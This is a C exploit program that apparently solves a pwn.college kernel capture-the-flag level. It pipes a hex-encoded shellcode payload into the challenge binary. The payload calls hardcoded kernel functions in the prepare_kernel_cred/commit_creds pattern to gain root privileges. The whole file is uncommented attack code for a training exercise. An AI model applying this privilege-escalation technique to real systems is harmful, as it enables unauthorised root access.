#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include <fcntl.h>

char *challenge = "/challenge/babykernel_level11.1";

void pwncollege() {
	int stdin_pipe[2];
	int result;
	result = pipe(stdin_pipe);
	pid_t pid = fork();
	if (pid == 0) {// in child
		result = dup2(stdin_pipe[0], STDIN_FILENO);
		close(stdin_pipe[1]);
		char *args[] = {challenge, NULL};
		char *envp[] = {NULL};

		execve(challenge, args, envp);
		//exit(0);
	} else {
		close(stdin_pipe[0]);
		sleep(40);
		char payload[] = "\x48\x31\xc0\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x04\x00\x00\x00\x48\x8d\x35\x03\x00\x00\x00\x0f\x05\xc3\x48\x31\xff\x48\xc7\xc0\xd0\x90\x08\x81\xff\xd0\x48\x89\xc7\x48\xc7\xc0\x90\x8d\x08\x81\xff\xd0\x48\xb8\x2f\x74\x6d\x70\x2f\x77\x6f\x00\x50\x54\x5f\x48\xc7\xc0\x80\x95\x08\x81\xff\xd0\xc3";
		write(stdin_pipe[1], payload, 74);
		close(stdin_pipe[1]);
		waitpid(pid, NULL, 0); //parent cant terminate before child
	}
}


int main(int argc, char** argv) {
	pwncollege();
	return 0;
}
